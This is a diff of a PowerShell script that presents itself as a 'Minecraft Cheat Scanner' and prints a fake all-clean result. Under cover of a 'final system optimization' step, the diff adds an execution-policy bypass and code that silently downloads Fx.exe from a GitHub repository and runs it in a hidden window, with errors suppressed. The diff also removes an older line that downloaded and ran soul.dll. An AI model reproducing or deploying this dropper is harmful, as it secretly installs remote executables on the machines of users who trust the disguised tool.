@@ -3,7 +3,10 @@ Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/C
     # Запускаем 
     Start-Process -FilePath "Checker.exe -WindowStyle Hidden
 
-# MINECRAFT CHEAT SCANNER v2.0 
+# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
+
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
 Clear-Host
 $Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"
 
@@ -69,7 +72,6 @@ Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
 Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
 Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
 Write-Host "=" * 50 -ForegroundColor Green
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll
 
 # ЛОГ (тоже чистый)
 $log = @"
@@ -92,6 +94,15 @@ $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
 try {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
+    
+    # Скачиваем everything в текущую папку
+    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden
+    
+    # Удаляем файл через 5 секунды
+    
     
 } catch {
     # Полностью скрываем ошибки
